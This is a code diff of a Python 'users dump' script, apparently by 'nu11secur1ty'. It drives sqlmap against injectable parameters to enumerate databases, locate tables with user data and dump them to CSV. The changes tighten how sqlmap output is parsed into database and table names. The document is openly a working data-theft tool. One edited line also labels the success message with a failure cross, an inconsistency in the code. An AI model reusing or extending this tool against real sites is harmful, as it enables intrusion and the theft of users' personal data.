@@ -77,8 +77,8 @@ def display_banner():
     print(Fore.CYAN + """
 ╔═══════════════════════════════════════════════════════════════╗
 ║                    👥 USERS DUMP MODULE                       ║
-║      SCANS FOR ANY TABLE WITH USER DATA                       ║
-║                   Author: nu11secur1ty                        ║
+║       SCANS FOR ANY TABLE WITH USER DATA                      ║
+║                    Author: nu11secur1ty                       ║
 ╚═══════════════════════════════════════════════════════════════╝
 """ + Style.RESET_ALL)
 
@@ -165,6 +165,7 @@ def run_sqlmap_with_techniques(cmd, description=""):
         return ""
 
 def get_databases(sqlmap_path, exploit_path, vuln_params):
+    """Get REAL databases using improved robust filter"""
     print(Fore.CYAN + "\n[+] Getting databases with your techniques..." + Style.RESET_ALL)
     
     cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
@@ -177,26 +178,38 @@ def get_databases(sqlmap_path, exploit_path, vuln_params):
     
     databases = []
     in_db_section = False
-    # ONLY system databases are filtered
-    skip = ['information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin', 'starting', 'ending']
+    
+    # Filter out common non-target / administrative outputs
+    skip = [
+        'information_schema', 'performance_schema', 'mysql', 'sys', 
+        'phpmyadmin', 'starting', 'ending', 'resuming', 'fetching', 'testing'
+    ]
     
     for line in output.split('\n'):
-        # Start collecting when we see the database list header
-        if "available databases [" in line.lower():
+        line_clean = line.strip()
+        
+        # Identify the start of database list
+        if "available databases [" in line_clean.lower():
             in_db_section = True
             continue
         
         if in_db_section:
-            match = re.search(r'\[\*\]\s+([\w\-_]+)', line)
+            # Skip noise or standard logging within active database sections
+            if any(log_lvl in line_clean.lower() for log_lvl in ["[info]", "[warning]", "[error]", "[critical]"]):
+                continue
+                
+            # Collect matched databases with standard wildcard format
+            match = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
             if match:
                 db = match.group(1)
                 if db.lower() not in skip:
                     databases.append(db)
-            else:
-                if line.strip() and not line.strip().startswith('['):
+            elif line_clean and not line_clean.startswith('[*]'):
+                # Terminate loop when logging leaves target bounds
+                if len(databases) > 0:
                     in_db_section = False
     
-    databases = sorted(set(databases))
+    databases = sorted(list(set(databases)))
     
     if not databases:
         print(Fore.YELLOW + "[!] No databases found. Using current database." + Style.RESET_ALL)
@@ -205,6 +218,7 @@ def get_databases(sqlmap_path, exploit_path, vuln_params):
     return databases
 
 def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
+    """Get REAL tables from a database using ASCII table structures"""
     db_name = database if database else "current database"
     print(Fore.CYAN + f"[*] Getting tables from: {db_name}..." + Style.RESET_ALL)
     
@@ -221,24 +235,25 @@ def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
         return []
     
     tables = []
-    in_table_section = False
-    
     for line in output.split('\n'):
-        if "Database:" in line or "tables for database" in line.lower():
-            in_table_section = True
-            continue
+        line_clean = line.strip()
         
-        if in_table_section:
-            # Look for table names from sqlmap output
-            match = re.search(r'\|+\s*(\w+)\s*\|+', line)
-            if match:
-                table = match.group(1)
-                if table and len(table) > 1 and table not in ['Table', '---', 'tables']:
-                    tables.append(table)
-            elif line.strip() and not line.strip().startswith('|') and not line.strip().startswith('['):
-                in_table_section = False
+        # Parse output from sqlmap ASCII grids (e.g., | table_name |)
+        match_grid = re.search(r'^\|\s*([\w\-_]+)\s*\|', line_clean)
+        if match_grid:
+            table = match_grid.group(1)
+            if table.lower() not in ['table', 'tables'] and not table.startswith('-'):
+                tables.append(table)
+                continue
+        
+        # Fallback to standard list extraction
+        match_list = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
+        if match_list:
+            table = match_list.group(1)
+            if table.lower() not in ['table', 'tables', 'starting', 'resuming', 'fetching']:
+                tables.append(table)
     
-    return list(set(tables))
+    return sorted(list(set(tables)))
 
 def find_user_tables(sqlmap_path, exploit_path, vuln_params):
     print(Fore.CYAN + "\n[+] Finding ALL user tables..." + Style.RESET_ALL)
@@ -435,7 +450,7 @@ def run_users_dump():
     print(Fore.CYAN + "\n" + "="*60)
     print("USERS DUMP COMPLETE")
     print("="*60 + Style.RESET_ALL)
-    print(Fore.GREEN + f"✅ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
+    print(Fore.GREEN + f"❌ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
     print(Fore.YELLOW + "📁 SQLmap saved CSV files in its default output directory" + Style.RESET_ALL)
     print(Fore.CYAN + "💡 Check sqlmap output directory for CSV files with user data" + Style.RESET_ALL)
     print("="*60)
